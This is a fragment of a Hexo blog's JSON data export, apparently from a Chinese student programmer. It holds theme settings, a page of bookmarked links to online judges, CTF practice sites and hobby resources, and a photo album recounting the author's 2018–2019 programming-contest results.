GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1161,"excerpt":"","more":"<h1 id=\"在线工具\"><a href=\"#在线工具\" class=\"headerlink\" title=\"在线工具\"></a>在线工具</h1><ul>\n<li><a href=\"https://tool.lu/\">在线工具 - 程序员的工具箱</a></li>\n<li><a href=\"http://oeis.org/\">The On-Line Encyclopedia of Integer Sequences® (OEIS®)</a></li>\n<li><a href=\"https://paste.ubuntu.com/\">Ubuntu Pastebin</a></li>\n<li><a href=\"http://dpaste.com/\">dpaste: New</a></li>\n</ul>\n<h1 id=\"ACM\"><a href=\"#ACM\" class=\"headerlink\" title=\"ACM\"></a>ACM</h1><h2 id=\"Online-Judge\"><a href=\"#Online-Judge\" class=\"headerlink\" title=\"Online Judge\"></a>Online Judge</h2><h3 id=\"Public\"><a href=\"#Public\" class=\"headerlink\" title=\"Public\"></a>Public</h3><ul>\n<li><a href=\"https://vjudge.net/\">Virtual Judge</a></li>\n<li><a href=\"https://codeforces.com/\">Codeforces</a></li>\n<li><a href=\"https://www.nowcoder.com/\">牛客网 - 互联网求职神器和备考学习平台</a></li>\n<li><a href=\"https://www.51nod.com/\">登录-51Nod</a></li>\n<li><a href=\"https://www.luogu.org/\">首页 - 洛谷 | 计算机科学教育新生态</a></li>\n<li><a href=\"https://www.jisuanke.com/\">计蒜客 - 学习面向未来的计算机科学</a></li>\n<li><a href=\"https://loj.ac/\">首页 - LibreOJ</a></li>\n<li><a href=\"https://hihocoder.com/\">hihoCoder</a></li>\n<li><a href=\"http://bailian.openjudge.cn/\">OpenJudge - 百练 - 首页</a></li>\n<li><a href=\"https://pintia.cn/\">PTA | 程序设计类实验辅助教学平台</a></li>\n</ul>\n<h3 id=\"University\"><a href=\"#University\" class=\"headerlink\" title=\"University\"></a>University</h3><ul>\n<li><a href=\"https://hpuoj.com/\">HPU Online Judge</a></li>\n<li><a href=\"http://acm.hdu.edu.cn/\">Welcome to Hangzhou Dianzi University Online Judge</a></li>\n<li><a href=\"http://nyoj.top/\">首页-练习场 - ACM在线评测系统</a></li>\n<li><a href=\"http://acm.zzuli.edu.cn/\">ZZULIOJ</a></li>\n<li><a href=\"http://acm.hi-54.com/index.php\">ZZNUOJ</a></li>\n</ul>\n<h2 id=\"Blogger\"><a href=\"#Blogger\" class=\"headerlink\" title=\"Blogger\"></a>Blogger</h2><ul>\n<li><a href=\"https://blog.csdn.net/u013615904/article/details/43373601\">ACM-高精度模板(综合篇) - 哇哈哈的专栏 - CSDN博客</a></li>\n</ul>\n<h1 id=\"CTF\"><a href=\"#CTF\" class=\"headerlink\" title=\"CTF\"></a>CTF</h1><h2 id=\"社区\"><a href=\"#社区\" class=\"headerlink\" title=\"社区\"></a>社区</h2><ul>\n<li><a href=\"https://x.threatbook.cn/\">首页 - 微步在线威胁情报社区</a></li>\n<li><a href=\"https://www.bugku.com/\">CTF_网络安全交流_白帽黑客论坛_BugkuCTF论坛</a></li>\n<li><a href=\"https://hackfun.org/\">HackFun</a></li>\n<li><a href=\"http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html\">Chrome 控制台不完全指南 - 刘哇勇 - 博客园</a></li>\n<li><a href=\"https://www.52pojie.cn/thread-188750-1-1.html\">RAR“秒破”教程</a></li>\n</ul>\n<h2 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h2><ul>\n<li><a href=\"https://www.ctftools.com/down/\">CTF资源库|CTF工具下载|CTF工具包|CTF工具集合</a></li>\n<li><a href=\"https://www.zhihu.com/question/30505597/answer/72163029\">针对CTF，大家都是怎么训练的？ - 知乎</a></li>\n</ul>\n<h2 id=\"训练\"><a href=\"#训练\" class=\"headerlink\" title=\"训练\"></a>训练</h2><ul>\n<li><a href=\"https://ctf.bugku.com\">BugkuCTF - 练习平台</a></li>\n<li><a href=\"http://ctf.nuptzj.cn/\">南京邮电大学网络攻防训练平台</a></li>\n<li><a href=\"http://hackinglab.cn/\">网络安全实验室|网络信息安全攻防学习平台</a></li>\n<li><a href=\"https://www.hackerrank.com/\">Dashboard | HackerRank</a></li>\n<li><a href=\"http://www.wechall.net/\">[WeChall] About WeChall</a></li>\n</ul>\n<h1 id=\"Linux\"><a href=\"#Linux\" class=\"headerlink\" title=\"Linux\"></a>Linux</h1><ul>\n<li><a href=\"http://man.linuxde.net/\">Linux命令大全(手册)_Linux常用命令行实例详解_Linux命令学习手册</a></li>\n</ul>\n<h1 id=\"Windows\"><a href=\"#Windows\" class=\"headerlink\" title=\"Windows\"></a>Windows</h1><h2 id=\"Office\"><a href=\"#Office\" class=\"headerlink\" title=\"Office\"></a>Office</h2><ul>\n<li><a href=\"https://support.office.com/zh-cn/excel?ui=zh-CN&amp;rs=zh-CN&amp;ad=CN&amp;fromAR=1\">Excel 帮助 - Office 支持</a></li>\n</ul>\n<h2 id=\"UTAU\"><a href=\"#UTAU\" class=\"headerlink\" title=\"UTAU\"></a>UTAU</h2><ul>\n<li><a href=\"http://utaujc.lofter.com/\">哈鲁鲁的UTAU教程站</a></li>\n<li><a href=\"http://utau.vocalover.com/\">歌声合成工具UTAU下载页面</a></li>\n</ul>\n<h2 id=\"SSL\"><a href=\"#SSL\" class=\"headerlink\" title=\"SSL\"></a>SSL</h2><ul>\n<li><a href=\"https://freessl.cn/\">FreeSSL首页 - FreeSSL.org 一个申请免费HTTPS证书的网站</a></li>\n<li><a href=\"https://www.chinassl.net/ssltools/free-ssl.html\">自签名免费SSL证书签发-中国数字证书CHINASSL</a></li>\n</ul>\n<h1 id=\"安卓\"><a href=\"#安卓\" class=\"headerlink\" title=\"安卓\"></a>安卓</h1><h2 id=\"ADB\"><a href=\"#ADB\" class=\"headerlink\" title=\"ADB\"></a>ADB</h2><ul>\n<li><a href=\"https://juejin.im/entry/57c00fe4c4c971006179838a#%E7%94%B5%E6%BA%90%E9%94%AE\">Awesome Adb——一份超全超详细的 ADB 用法大全 - Android - 掘金</a></li>\n</ul>\n<h1 id=\"Robots\"><a href=\"#Robots\" class=\"headerlink\" title=\"Robots\"></a>Robots</h1><ul>\n<li><a href=\"http://www.turingapi.com/\">图灵机器人-智能好用的聊天机器人</a></li>\n<li><a href=\"https://cqp.cc/forum.php?gid=71\">酷Q - 酷Q社区</a></li>\n</ul>\n<h1 id=\"区块链\"><a href=\"#区块链\" class=\"headerlink\" title=\"区块链\"></a>区块链</h1><h2 id=\"BTC\"><a href=\"#BTC\" class=\"headerlink\" title=\"BTC\"></a>BTC</h2><ul>\n<li><a href=\"https://www.blockchain.com/\">Blockchain - 最可信的加密货币公司</a></li>\n</ul>\n<h1 id=\"游戏\"><a href=\"#游戏\" class=\"headerlink\" title=\"游戏\"></a>游戏</h1><h2 id=\"Minecraft\"><a href=\"#Minecraft\" class=\"headerlink\" title=\"Minecraft\"></a>Minecraft</h2><h3 id=\"Resource-Pack\"><a href=\"#Resource-Pack\" class=\"headerlink\" title=\"Resource Pack\"></a>Resource Pack</h3><ul>\n<li><a href=\"https://shaders.fandom.com/wiki/Shader_Packs\">Shader Packs | Minecraft Shaders Wiki | FANDOM powered by Wikia</a></li>\n<li><a href=\"https://www.minecraftmoddownloads.com/\">Minecraft Mod Downloads</a></li>\n<li><a href=\"https://resourcepack.net/\">Resource Packs for Minecraft | Texture Packs</a></li>\n<li><a href=\"http://www.mcbbs.net/forum.php?mod=viewthread&amp;tid=306895&amp;page=1&amp;authorid=178523\">[技术性存档修改工具]NBT Explorer</a></li>\n</ul>\n<h3 id=\"Blogger-1\"><a href=\"#Blogger-1\" class=\"headerlink\" title=\"Blogger\"></a>Blogger</h3><ul>\n<li><a href=\"http://www.rmcteam.org/\">RedstoneMachineryCommunication - 红石机械交流促进会</a></li>\n</ul>\n<h3 id=\"Wiki\"><a href=\"#Wiki\" class=\"headerlink\" title=\"Wiki\"></a>Wiki</h3><ul>\n<li><a href=\"https://minecraft-zh.gamepedia.com/Minecraft_Wiki\">中文Minecraft Wiki - 最详细的官方我的世界百科</a></li>\n<li><a href=\"https://www.mcmod.cn/\">MC百科|最大的Minecraft中文MOD百科</a></li>\n<li><a href=\"https://minecraft-ids.grahamedgecombe.com/\">Minecraft ID List</a></li>\n</ul>\n<h2 id=\"小游戏\"><a href=\"#小游戏\" class=\"headerlink\" title=\"小游戏\"></a>小游戏</h2><ul>\n<li><a href=\"https://blog.todest.cn/games/mikutap\">Mikutap</a></li>\n<li><a href=\"https://patatap.com/\">Patatap</a></li>\n<li><a href=\"https://blog.todest.cn/games/snake\">Snake</a></li>\n</ul>\n"},{"title":"相册","type":"photo","password":"algorithm","mathjax":true,"_content":"<!-- \n<center><font size=5><strong>名称<br>2019/00/00</strong></font></center>\n![]()\n\n<br><br>\n\n\n---\n-->\n<center><font size=5><strong>河南省第十二届ACM大学生程序设计竞赛<br>2019/05/07</strong></font></center>\n![河南省第十二届ACM大学生程序设计竞赛](https://cdn.file.todest.cn/blog/photo/20190507.jpg)\n又一次省赛，题目被喷得厉害，$D$题虽然数据出锅了，重判了，但是简单题，写的有点晚了，$G$题一开始就开始看了，结果发现思路还是不对，$F$题写了个假贪心，随便改了顺序最后十分钟过了，五道题，貌似是第一次正式比赛写够一半题目，拿了个银奖，其实五题还是有金的，怎么说呢，有点小失望，实名羡慕 [煜神](https://blog.wzy1999.wang/)（ICPC，CCPC省赛金牌，ICPC亚洲区域赛银牌大佬）。\n放一张伙伴们的合照纪念下，希望下次还能凑齐。\n\n![](https://cdn.file.todest.cn/blog/photo/20190509214020.jpg)\n<br><br>\n\n\n---\n<center><font size=5><strong>“卓见杯”第五届CCPC中国大学生程序设计竞赛河南省赛<br>2019/04/13</strong></font></center>\n![“卓见杯”第五届CCPC中国大学生程序设计竞赛河南省赛](https://cdn.file.todest.cn/blog/photo/CCPC20190416103351.jpg)\n又换队友了，这次和栓瑞、丹丹一起拿了个银牌，错失金牌（大哭），主要是$I$题我以为$M$就是 4 ，暴力一早就已经写好了，栓瑞来了句$M$不一定是 4 吧，然后我就看了下题目，瞬间懵逼，以为暴力肯定会超时，结果发现正解居然真的是暴力。错失了金牌￥500，甚至一血￥500，不过还好银牌有个充电宝。\n<br><br>\n\n\n---\n<center><font size=5><strong>第四届“中国高校计算机大赛-团体程序设计天梯赛”总决赛 <br>2019/03/30</strong></font></center>\n![第四届“中国高校计算机大赛-团体程序设计天梯赛”总决赛](https://cdn.file.todest.cn/blog/photo/Lanqiao.jpg)\n天梯赛省二，还是太菜了啊。不好意思，拖了队伍后腿。\n<br><br>\n\n\n---\n<center><font size=5><strong>ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/焦作站（本校站）<br>2018/11/25</strong></font></center>\n![ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/焦作站（本校站）](https://cdn.file.todest.cn/blog/photo/ICPC-JiaoZuo.jpg)\n本次比赛，我是作为志愿者出场的，全程真的是累。\n<br><br>\n\n\n---\n<center><font size=5><strong>ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/徐州站<br>2018/10/27</strong></font></center>\n![ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/徐州站](https://cdn.file.todest.cn/blog/photo/Xuzhou.jpg)\n<table border rules=none cellspacing=0>\n    <tr>\n        <td><center><img src=\"https://cdn.file.todest.cn/blog/photo/IMG_20181028_141410.jpg\">鸿杰大佬</center></td>\n        <td><center><img src=\"https://cdn.file.todest.cn/blog/photo/IMG_20181028_155330.jpg\">他们队</center></td>\n        <td><center><img src=\"https://cdn.file.todest.cn/blog/photo/IMG_20181028_141619.jpg\">猛神大佬</center></td>\n    </tr>\n</table>\n徐州诶，又一次来到这个地方，上一次和猛神打铁而归，这次和煜神、行神、一个队，运气爆棚一题躺银，全程数气球。\n<br><br>\n\n\n---\n<center><font size=5><strong>2018年ACM国际大学生程序设计竞赛全国邀请赛（江苏）<br>2018/06/03</strong></font></center>\n![2018年ACM国际大学生程序设计竞赛全国邀请赛（江苏）](https://cdn.file.todest.cn/blog/photo/2018Xuzhou.jpg)\n再次和队友出去比赛，王老师给我们定了个目标，不爆零就行，我们果然不负众望，写了两题，打了个铁。\n<br><br>\n\n\n---\n<center><font size=5><strong>河南省第十一届大学生程序设计竞赛<br>2018/05/27</strong></font></center>\n![河南省第十一届大学生程序设计竞赛](https://cdn.file.todest.cn/blog/photo/20180527.jpg)\n和猛神，骆九一个队，拿了个铜，还行吧，反正队友挺高兴的（手动滑稽）。\n<br><br>\n\n\n---\n<center><font size=5><strong>第九届软件与信息技术专业人才大赛<br>2018/04/01</strong></font></center>\n![第九届软件与信息技术专业人才大赛](https://cdn.file.todest.cn/blog/photo/20180401.jpg)\n比赛体验还行，就是伙食体验极差！！！\n合照找不到了，就放一张大佬照片留作纪念。\n<br><br>\n---","source":"photo/index.md","raw":"---\ntitle: 相册\ntype: \"photo\"\npassword: algorithm\nmathjax: true\n---\n<!-- \n<center><font size=5><strong>名称<br>2019/00/00</strong></font></center>\n![]()\n\n<br><br>\n\n\n---\n-->\n<center><font size=5><strong>河南省第十二届ACM大学生程序设计竞赛<br>2019/05/07</strong></font></center>\n![河南省第十二届ACM大学生程序设计竞赛](https://cdn.file.todest.cn/blog/photo/20190507.jpg)\n又一次省赛，题目被喷得厉害，$D$题虽然数据出锅了，重判了，但是简单题，写的有点晚了，$G$题一开始就开始看了，结果发现思路还是不对，$F$题写了个假贪心，随便改了顺序最后十分钟过了，五道题，貌似是第一次正式比赛写够一半题目，拿了个银奖，其实五题还是有金的，怎么说呢，有点小失望，实名羡慕 [煜神](https://blog.wzy1999.wang/)（ICPC，CCPC省赛金牌，ICPC亚洲区域赛银牌大佬）。\n放一张伙伴们的合照纪念下，希望下次还能凑齐。\n\n![](https://cdn.file.todest.cn/blog/photo/20190509214020.jpg)\n<br><br>\n\n\n---\n<center><font size=5><strong>“卓见杯”第五届CCPC中国大学生程序设计竞赛河南省赛<br>2019/04/13</strong></font></center>\n![“卓见杯”第五届CCPC中国大学生程序设计竞赛河南省赛](https://cdn.file.todest.cn/blog/photo/CCPC20190416103351.jpg)\n又换队友了，这次和栓瑞、丹丹一起拿了个银牌，错失金牌（大哭），主要是$I$题我以为$M$就是 4 ，暴力一早就已经写好了，栓瑞来了句$M$不一定是 4 吧，然后我就看了下题目，瞬间懵逼，以为暴力肯定会超时，结果发现正解居然真的是暴力。错失了金牌￥500，甚至一血￥500，不过还好银牌有个充电宝。\n<br><br>\n\n\n---\n<center><font size=5><strong>第四届“中国高校计算机大赛-团体程序设计天梯赛”总决赛 <br>2019/03/30</strong></font></center>\n![第四届“中国高校计算机大赛-团体程序设计天梯赛”总决赛](https://cdn.file.todest.cn/blog/photo/Lanqiao.jpg)\n天梯赛省二，还是太菜了啊。不好意思，拖了队伍后腿。\n<br><br>\n\n\n---\n<center><font size=5><strong>ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/焦作站（本校站）<br>2018/11/25</strong></font></center>\n![ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/焦作站（本校站）](https://cdn.file.todest.cn/blog/photo/ICPC-JiaoZuo.jpg)\n本次比赛，我是作为志愿者出场的，全程真的是累。\n<br><br>\n\n\n---\n<center><font size=5><strong>ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/徐州站<br>2018/10/27</strong></font></center>\n![ACM-ICPC国际大学生程序设计竞赛亚洲区域赛/徐州站](https://cdn.file.todest.cn/blog/photo/Xuzhou.jpg)\n<table border rules=none cellspacing=0>\n    <tr>\n        <td><center><img src=\"https://cdn.file.todest.cn/blog/photo/IMG_20181028_141410.jpg\">鸿杰大佬</center></td>\n        <td><center><img src=\"https://cdn.file.todest.cn/blog/photo/IMG_20181028_155330.jpg\">他们队</center></td>\n        <td><center><img src=\"https://cdn.file.todest.cn/blog/photo/IMG_20181028_141619.jpg\">猛神大佬</center></td>\n    </tr>\n</table>\n徐州诶，又一次来到这个地方，上一次和猛神打铁而归，这次和煜神、行神、一个队，运气爆棚一题躺银，全程数气球。\n<br><br>\n\n\n---\n<center><font size=5><strong>2018年ACM国际大学生程序设计竞赛全国邀请赛（江苏）<br>2018/06/03</strong></font></center>\n![2018年ACM国际大学生程序设计竞赛全国邀请赛（江苏）](https://cdn.file.todest.cn/blog/photo/2018Xuzhou.jpg)\n再次和队友出去比赛，王老师给我们定了个目标，不爆零就行，我们果然不负众望，写了两题，打了个铁。\n<br><br>\n\n\n---\n<center><font size=5><strong>河南省第十一届大学生程序设计竞赛<br>2018/05/27</strong></font></center>\n![河南省第十一届大学生程序设计竞赛](https://cdn.file.todest.cn/blog/photo/20180527.jpg)\n和猛神，骆九一个队，拿了个铜，还行吧，反正队友挺高兴的（手动滑稽）。\n<br><br>\n\n\n---\n<center><font size=5><strong>第九届软件与信息技术专业人才大赛<br>2018/04/01</strong></font></center>\n![第九届软件与信息技术专业人才大赛](https://cdn.file.todest.cn/blog/photo/20180401.jpg)\n比赛体验还行，就是伙食体验极差！！！\n合照找不到了，就放一张大佬照片留作纪念。\n<br><br>\n---","date":"2020-12-01T14:42:41.996Z","updated":"2020-12-01T14:42:41.996Z","path":"photo/index.html","comments":1,"layout":"page","_id":"ckieexkad000eqse53b4g96q3","content":"<div id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <div class=\"hbe-input-container\">\n  <input type=\"password\" id=\"hbePass\" placeholder=\"\" />\n    <label for=\"hbePass\">请输入密码</label>\n    <div class=\"bottom-line\"></div>\n  </div>\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"774a2e5bb70df4dded6a43d9c29f7313568b9dd93486794c373583b6d237d74a\">b9e77aead804c8e59e04e0add7648bbcb382ba5b957fcb6d1580e0bc6050af6a3a0871e915bff4d233c64f6fb16a4a812983c820d6249c356bf5c0bdb89837d7af2e7c7b7918c747df035d4d2314ea5b3f6eea7178390e594df0cdb4b58c25adc92150682e31e29b70388191d20d28eebc2df2bc25d11676c59193617e5104a4b89a2cf35ff418691c03e7dc19acc9a2a0788dbb072edb9780811839010511c0d7e9f42fc99dc8ef24a36547fd6a5d8185f6489cb0571849080b65c3c1ff64e98df4a33c833b9f2c41342273e9924061b6a491e1825382f2362d37420e7695de75774351131ecd34f518f93445f8a76f7213026662046d0836cfbeaea957e073cb5d8d79c109efd9a7474f26b59c8d2b1ba7a99969b12f4ae8fd693f80a279f05302a9f10e605e1cadfe4e73e7e489e31724549e800c20890f9cbbe7a1430827079002e4d59ba7262ef25341b9c7ce5fc876fc7c3e82f983f97c0bb410c783c260f816d66dd0b4a3dd59baf5d0ca12f79b1bc7001bcc9b608d4322f17b2123be9da3cf1ea4d30cb5db46770ca3a17daf5e0d094e58e9e64be54cfddf666ec17339968af24ae52c6e7c116afab398477bf85961f47a35ae89dea33d3019a75c57d6cb4822c326a77b30412dac9d231a65f89d76080044adcac4e47f9f0dfe35226b319642ae6f8527135846ad4f0851acdf58b6ee6d1769f6b14c54f4a0f4edd97f7e097b8a32b174a6cd27271ee0eb444aa68efb1d5692eb1fc3b5757008f1759bbca6667308f42e5343ffd3c9a22780a9c6d58e3107b65d047508e41c8b96d97d5e9d43305ce80ef604a61584b099c2a29fc52f8c2205da3c8581ff004219ee7e499dff7ff4d172fdf361ebf2f11eb095fe348ea4dc2a2732d0b889e28a9d44de3909307a89d9aa270356c567b0b0d78005ef1045944ceace1fe8c225d34a5e00f5301bacadc285d4c59b663611317d7a56628967cbe06d4af87b5f15ff42764e79fde31214899d6b25987827dfa155c044a8c56d72c6ff47df286f572821d8dc7ca3d789b84db338b06ab02525acf8a4085363a2800bf2f3e17d9504f73655aba0489e9d1eeafdba45f6f1905f7648e071ddbc78cc4a80306a90149e06863e5bcdff9915a8f8f9eafd8e3b469afd3c39d8b2353aa61871fc27ccdfe402ced42264f7e1df2de97be7d5d5394b9e30584e16593b378fd4e5f4f5e4e9e5b08b6c4457be7c3b11a41dc4f09ae1e2ddf609550581f9b190039194d3e915313bc32ca2e7c82d4f1aa55057d7b438df5e515f1c0b8fa7becb17d6e3d4a1e84972323536d4e360ad21a865766fbb6b2eec7342f155e66958d2c41f733c14d600d31c586b322455f26bdd889bc2657a7d5590cd1b1c1e844198199c7974466b9a1be3184606c0e40aa4fbefb8b9ee2df2694dcd7ed6462c7769eed5a723e8c7b57cdd0e7a264b0741765641bb49f29f3fdbb516cad0ad4f852c72bca4876c49f99895cd3c93fe47b22a373a38a62fac8008b661dba5a0a0b722964015cef17cc8eaca86757eefa7cfefa425c1609fa9039fe2403973b904969ec2b6647dca1f5c9b96ed68ce969815e411304f34e85af371bb0c1c9db090d138aa2ca072a5b2da29a476cac92f7057f2028114c72c68db807eb15e88cff9de19ac9485cf6789f31ee561d0501007b410c4eefe42010567b64ee6653e13c49553a40e02e62388fc0d15e783b621081806f15f8db02f65c338e2e95ae4bf870b3925464502b6470c2e2531405cfa69e418b2ebda8ae5dca814df9c0108a2ca602ce6215068d88f402350a4cc4afd44864cbdceb52f4e8e2dcd76260156e3c8ff7e5680ef4e59a48c619779201d84ef081e48c24594bf30053cfbd6cc485b8a3ba86f41c7538bd3985d4523197b176c30ea26e8ac540a2432f105e91c0d47351367e61a029b43ec5119ab85fd79d22d4b301ad42cfa8bcebdb77b828a212b76216e081890c331d938399370261b7dc99a198cca2a76f272402239daf4ae99affb858bd0c09f4c682308c93456f60358ed3f99cd29d2b4d24f0d778c1f17ab830c0298d79ac5a349c8c14147fbe26f1d0f5b505a00b51a5a9760fd19bc9e4508393acdbd9704097721a4d925ab1195586a05278a2f26c9de4a253917d47c6ce6ba3baf7ff1c40808ae7d6165549b66fc2e757c7ad07860e1ccc75b8e396e9e61b10a658dc29375af215323ac7ad496cc48bb04ba1e2b8995437289f2d10dca7cb75fa1ffdc86082429ab9e85db7cb028a7ff46c42e2a0fb36b9a7faf97c3292c67dcc633ace7b386b6a737b55c767dad0f4289878d1aff3b2e4977452fad56b9210bf56e073d4010b7d32252af7f76a3141b5cd3d6b535560405b590ba08ad94cb3c2312967a0e4f0f4e4df975645ff8efd9d5c1fff9b9d46d7e9959d1f8392052c07adf0e321974d7ea344d990f90169fbdf80cc5dbf36e75a6c675833c669e08b0667d45a7abb2095f635b3a4539744439f668498c87e48e1ee3d314c31953b6a3577809a16d82620c8d696d7d2d9dd735690e363199c7ef876214c2828cae182a58b3566abea9e66e59e9b97b9edb1b8e79595ad6977df5a523632b9a6e0aecc500f1f299ee907c058b0bda085b632a8338d2f829405dce36c960adbb2b65f5c07074b0427ddc515c739d32523c43580cdaaf8d46105fe40c8ebdbf5022fe21a23188bfed4597e0a06ba2fe7a78c4847f3846be3247bea2841c2d4b34870a1192eaf8ea6cb6334e4f23c1356fb56c01c5566d7c0521b2c0cdaccaec95faa020d688e159411dcfd50bbbd82bb8f1a69dca279b410c81930a412c06bd731fb8522ce38e23f46d1f676fa82d8d9bf0d47082629c9d99b229f83939a39e213611a487f47504ce1986aa51851629046ef646e096f54f0d680928a217f5245871d35e25f3832e448aedbc74deebc6a88296fe18857c2ccfb42e3a366b75a82e5c7fc0efedcc28bace2b212705ded155f84c249c6def9ffb7ce26d4911bfec96cb9dc6b456b67bb6915dcfc517727280119e6034c97fc00c7a174abdd610b83fa6d0b6baad71fa11a4245a6a95333cc686d5c823d38982c4d40563331ad2a9eaef8dd5f96b96fa5c533648843af52b28b21a8f5df75805d5925f00b8e291fe3680715f7477d32e3acb431dbcbed6ab1d8909b7f901fa979cf3230223e3f57549f8a252153dbbd325b21c75d5950d0e09147b8a01e3bc3b4507f7a149edbb87af79ccf8c7281ff6ef8b7f01939a56e1620659e5f0c86932d8a91764cddecdf442b4775a703d00070f7007389025e7afc67db75c3fc5f74254bd22b502c478169c72627e10f0a7f4dd8352ed32bb3142ac172b6e63286649a9a60823680d98fe9f4108ad7c8b273d424db671c2afd85d2e351a0fa550384ffab7e88971ddfb0b32fdcf9a0f63092c8bae4b7712f5211ad0a22fe8d6fa369acb665b6ef92089efdbb94b9374de26117a3dce735ded1851c1b360c6bfc210a74031ac8d33fc6a56286066348734fb0e268b13fe5ac96f3e1e35f5c46180656ac7ff0b25522c6bb058af4af944be08cb9823da020b9c46f3de41787b8a7f5e4f72b9c4452157c7dbe68313cb6337c62cd2a1d6974eeb2475944ad5005b4198e628adc091f2ee07989e8fe02ee4c48f82d7ae1a32db433e85b9f6f7a8a14c9b99b3c093e4b85b2a3ccac4386a8c55d3383fbc796a6f28d786bce05b8d008eec2ca5716a461fc6799ed6ade63545693e962ed67e377115680945d8ad63188c7e36988c68e03ff4e9eb1114a279c254610ea619e37bf194c0eef874172773bdc25610a08ec313ced8130faf9c37e14c242c2fee341d90013c6ff7bbd32125d9e1b1bd671f6135c0673d32c6badbc2df34e4e74a8391ae4bf13465364ffcde9a0dc77ca6ef727f1a60b811067eb723ab6fc4d749f570e8a708a375aaa4a794f45fa5d5551fceae8f0d4156eadff866c846457880e57a5c8f11faff0fb571f8a46885efb8422ab92cee0c810ba0108fb81e5414785e7b57fafc62a188a158a7b0a68c2038f9848e5ffda9000fe8b9fdc1c3af03ac7477e377b888bb448a8690b81dc2b3adbd7ed26312cb8addbf40da5b2f28f75e04eb830a542685957f1020622dc68470800e6320c42ae318acd4caf4a952f566f1d68718608a751cc959cbb758c3faa673251a930611fe3c7f68508ff5936dd2ab30c124f505d493c84730fa8858d26fbd616ff2d364693c92ecc14148020ab217ce5e9c3eb06637d31f844773a42c92bbf512f88c766d70ad6b9cc6b678c04a11efcbc851298961d7b9a90726050d4b77631837c5c0a40ea7644bd30bce2ab8bb0da04c6a49d66b59d8a28815dd4e14deb98f1311d98a5cd39e64e8341d07719a3ea5127fe738decca3037acdc4bca40eea3f63cdc34d2ad6e9231b82b045f4569edcc0223478b5d9d89814881d51a561b349e4f8f9e2e2bd32d14f43e12852a98770809f2894fa88416282f51b00aa85db963592d331a34f9c7d1399b0617009baba63394ef37788e2f1686480551de11e52a56653c4e0b3ad276ad9eef317a53d1ce33ca89579f1beec96f7228c4bd15340bdf